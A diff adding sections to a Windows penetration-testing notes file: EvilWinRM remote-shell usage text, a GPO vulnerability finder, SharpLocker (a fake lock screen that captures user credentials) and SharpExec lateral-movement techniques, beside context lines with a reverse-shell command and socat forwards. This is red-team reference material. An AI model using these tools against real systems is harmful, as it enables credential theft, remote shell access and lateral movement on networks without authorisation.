@@ -64,6 +64,8 @@ A place for me to store my notes/tricks for Windows Based Systems.
       * <a href="#-mssql-exploiting-powerupsql">MSSQL Exploiting (PowerUpSQL)</a>
       * <a href="#-malicious-macro-with-msbuild">Malicious Macro with MSBuild</a>
       * <a href="#-weirdhta---undetectable-hta">WeirdHTA - Undetectable HTA</a>
+      * <a href="#-evilwinrm">EvilWinRM</a>
+      * <a href="#-GetVulnerableGPO">GetVulnerableGPO</a>
    * <a href="#privilege-escalation">Privilege Escalation</a>
       * <a href="#-basics-1">Basics</a>
       * <a href="#-powerupps1-sometimes-a-quick-win">PowerUp.ps1 (Sometimes a Quick Win)</a>
@@ -108,6 +110,7 @@ A place for me to store my notes/tricks for Windows Based Systems.
       * <a href="#-safetykatz">SafetyKatz</a>
       * <a href="#-sharpdpapi">SharpDPAPI</a>
       * <a href="#-sharpsniper">SharpSniper</a>
+      * <a href="#-sharplocker">SharpLocker</a>
       * <a href="#-check-for-missing-kbs">Check for Missing KB's</a>
       * <a href="#-decrypt-efs-files-with-mimikatz-if-adminsystem">Decrypt EFS Files with Mimikatz if Admin/System</a>
       * <a href="#-uac-bypass">UAC Bypass</a>
@@ -131,6 +134,7 @@ A place for me to store my notes/tricks for Windows Based Systems.
       * <a href="#-powershell-port-forward">Powershell Port Forward</a>
       * <a href="#-invoke-socks-proxy">Invoke Socks Proxy</a>
       * <a href="#-socat-for-windows">Socat for Windows</a>
+      * <a href="#-sharpexec">SharpExec</a>
       * <a href="#-secure-sockets-funneling">Secure Sockets Funneling</a>
       * <a href="#-chisel-fast-tcp-tunnel-over-http-secured-by-ssh">Chisel (Fast TCP Tunnel over HTTP secured by SSH)</a>
       * <a href="#-crackmapexec-1">CrackMapExec</a>
@@ -969,6 +973,44 @@ python3 weirdhta.py 10.10.10.10 4444 --command 'c:\windows\system32\cmd.exe' (cu
 ```
 
 
+
+#### [](#header-4) EvilWinRM
+
+```powershell
+#https://github.com/Hackplayers/evil-winrm
+
+Ultimate Shell for WinRM Connections
+
+Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ]
+    -S, --ssl                        Enable SSL
+    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
+    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
+    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path
+    -e, --executables EXES_PATH      C# executables local path
+    -i, --ip IP                      Remote host IP or hostname (required)
+    -U, --url URL                    Remote url endpoint (default /wsman)
+    -u, --user USER                  Username (required)
+    -p, --password PASS              Password
+    -P, --port PORT                  Remote host port (default 5985)
+    -V, --version                    Show version
+    -h, --help                       Display this help message
+
+```
+
+
+
+#### [](#header-4) GetVulnerableGPO
+
+```powershell
+#https://github.com/gpoguy/GetVulnerableGPO
+
+PowerShell script to find 'vulnerable' security-related GPOs that should be hardened (for more background, see the GPO discoverability section of this blog: https://sdmsoftware.com/group-policy-blog/security-related/security-fun-bloodhound-ms16-072-gpo-discoverability/) Requires GPMC & SDM Software GPMC PowerShell Module (used to more easily parse GP settings during the search): https://s3.amazonaws.com/sdmsoftware.com/dl/SDM-GPMC-Module2.0Setup.zip
+
+```
+
+
+
+
 ## [](#header-2)Privilege Escalation
 
 Reference: https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
@@ -1675,6 +1717,17 @@ User: emusk - IP Address: 192.168.37.130
 
 
 
+#### [](#header-4) SharpLocker
+
+```powershell
+#https://github.com/Pickfordmatt/SharpLocker
+
+SharpLocker helps get current user credentials by popping a fake Windows lock screen, all output is sent to Console which works perfect for Cobalt Strike.
+
+```
+
+
+
 #### [](#header-4) Check for Missing KB's
 
 ```powershell
@@ -2075,6 +2128,24 @@ All SSL Connections will be redirected to 202.54.1.5:443
 
 #Non SSL Port Forward
 socat TCP-LISTEN:80,fork TCP:202.54.1.5:80
+```
+
+
+#### [](#header-4) SharpExec
+
+```powershell
+#https://github.com/anthemtotheego/SharpExec
+
+C# Implementation of Conventional Lateral Movement Techniques, such as 
+
+-WMIExec - Semi-Interactive shell that runs as the user. Best described as a less mature version of Impacket's wmiexec.py tool.
+
+-SMBExec - Semi-Interactive shell that runs as NT Authority\System. Best described as a less mature version of Impacket's smbexec.py tool.
+
+-PSExec (like functionality) - Gives the operator the ability to execute remote commands as NT Authority\System or upload a file and execute it with or without arguments as NT Authority\System.
+
+-WMI - Gives the operator the ability to execute remote commands as the user or upload a file and execute it with or without arguments as the user.
+
 ```
 
 
